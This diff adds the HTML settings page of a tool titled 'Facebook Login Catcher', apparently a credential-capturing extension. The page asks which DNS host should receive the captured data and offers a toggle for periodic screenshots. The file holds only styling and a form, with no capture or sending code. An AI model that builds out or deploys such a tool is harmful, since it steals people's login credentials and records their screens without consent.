@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Facebook Login Catcher</title>
+<link href='https://fonts.googleapis.com/css?family=Amatic+SC:700,400' rel='stylesheet' type='text/css'>
+<link href='https://fonts.googleapis.com/css?family=Open+Sans:300,600,400' rel='stylesheet' type='text/css'>
+<style>
+body{
+	background-color: #222222;
+	color: #FFFFFF;
+	font-family: 'Open Sans', sans-serif;
+	font-size: 16px;
+	font-weight: 300;
+	background-image: url('../img/background.jpg');
+	background-repeat: no-repeat;
+	background-size: cover;
+}
+h1{
+	font-family: 'Amatic SC', cursive;
+	text-align: center;
+	font-size: 43px;
+}
+.main-container{
+	min-width: 300px;
+	min-height: 400px;
+	max-width: 300px;
+	max-height: 400px;
+}
+.form-group{
+	margin-top: 5px;
+	margin-bottom: 15px;
+	text-align: center;
+}
+.form-control{
+	text-align: center;
+	display: block;
+    width: 97%;
+    height: 30px;
+    padding: 0px 4px;
+    font-size: 14px;
+    line-height: 1.42857143;
+    color: #555;
+    background-color: rgba(255,255,255,0.8);
+    background-image: none;
+    border: 1px solid #ccc;
+    box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
+    transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s;
+}
+.onoffswitch {
+    position: relative; width: 83px;
+    margin-left: auto;
+    margin-right: auto;
+    -webkit-user-select:none; -moz-user-select:none; -ms-user-select: none;
+}
+.onoffswitch-checkbox {
+    display: none;
+}
+.onoffswitch-label {
+    display: block; overflow: hidden; cursor: pointer;
+    border: 2px solid #F56C6C; border-radius: 50px;
+}
+.onoffswitch-inner {
+    width: 200%; 
+    margin-left: -100%;
+    transition: margin 0.3s ease-in 0s;
+}
+.onoffswitch-inner:before, .onoffswitch-inner:after {
+    display: block; 
+    float: left; 
+    width: 50%; 
+    height: 36px; 
+    padding: 0; 
+    line-height: 36px;
+    font-size: 16px; 
+    color: white; 
+    font-family: Trebuchet, Arial, sans-serif; 
+    font-weight: bold;
+    box-sizing: border-box;
+}
+.onoffswitch-inner:before {
+    content: "On";
+    padding-left: 10px;
+    background-color: rgba(255,255,255,0.8);
+    color: #27A1CA;
+    border-color: #27A1CA;
+}
+.onoffswitch-inner:after {
+    content: "Off";
+    padding-right: 10px;
+    background-color: rgba(255,255,255,0.8); 
+    color: #F56C6C;
+    text-align: right;
+    border-color: #F56C6C;
+}
+.onoffswitch-switch {
+    display: block; width: 34px; margin: 1px;
+    background: #F56C6C;
+    position: absolute; top: 0; bottom: 0;
+    right: 43px;
+    border: 2px solid #F56C6C; 
+    border-radius: 50px;
+    transition: all 0.3s ease-in 0s; 
+}
+.onoffswitch-checkbox:checked + .onoffswitch-label {
+    border-color: #27A1CA;
+}
+.onoffswitch-checkbox:checked + .onoffswitch-label .onoffswitch-inner {
+    margin-left: 0;
+}
+.onoffswitch-checkbox:checked + .onoffswitch-label .onoffswitch-switch {
+    right: 0px; 
+    background-color: #27A1CA;
+    border-color: #27A1CA;
+}
+</style>
+</head>
+
+<body>
+	<h1>Facebook Login Catcher</h1>
+	<section class="main-container">
+		<article class="form-group">
+			<label for="server-input">What is DNS to send data?</label>
+			<input type="text" placeholder="dns without http:// or htpps://" id="server-input" name="server-input" class="form-control">
+		</article>
+		<article class="form-group">
+			<label for="screenshots-enabled">Enable periodical screenshots</label>
+			<div class="onoffswitch">
+			    <input type="checkbox" name="onoffswitch" class="onoffswitch-checkbox" id="myonoffswitch">
+			    <label class="onoffswitch-label" for="myonoffswitch">
+			        <span class="onoffswitch-inner"></span>
+			        <span class="onoffswitch-switch"></span>
+			    </label>
+			</div>
+		</article>
+	</section>
+</body>
+
+</html>
